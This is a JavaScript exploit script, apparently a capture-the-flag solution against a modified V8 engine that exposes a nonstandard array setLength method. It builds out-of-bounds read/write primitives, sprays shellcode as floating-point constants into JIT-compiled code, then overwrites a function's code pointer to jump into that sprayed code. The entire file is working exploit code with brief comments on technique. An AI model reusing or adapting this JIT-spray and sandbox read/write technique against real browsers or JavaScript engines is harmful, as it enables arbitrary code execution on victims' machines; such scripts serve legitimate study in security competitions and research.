function dp(x){} //{ %DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
function d22u(val)
{ //double ==> 2 * Uint32
	__dvCvt.setFloat64(0, val, true);
}
const hex = (x) => ("0x" + x.toString(16));

/*
One weird thing is that as long as a function contains floating const,
allocated array object cannot reach the function object by OOB;
therefore, we use TypedArray arbitrary R/W in sbx to rewrite its field.
*/
const foo = ()=>
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {
	foo();foo();foo();foo();
}

const f = () => 123;
const arr = [1.1];
const o = {x:0x1337, a:foo, b:f}; // x makes a and b double align
const ua = new Uint32Array(2);

arr.setLength(36);
d22u(arr[3]);
const fooAddr = __dvCvt.getUint32(0, true);
const fAddr = __dvCvt.getUint32(4, true);
print(hex(fAddr));dp(f);
dp(ua);

function readOff(off)
{
	arr[35] = u2d((off-7) * 0x100000000);
	return ua[0];
}
function writeOff(off, val)
{
	arr[35] = u2d((off-7) * 0x100000000);
	ua[0] = val;
}
print(hex(fooAddr));dp(foo);
jitAddr = readOff(fooAddr + 0x17);
print(hex(jitAddr));
print(hex(readOff(jitAddr + 0xb3)));
writeOff(fAddr + 0x17, jitAddr + 0xb3 - 0x3f);
print(hex(jitAddr + 0xb3));
f();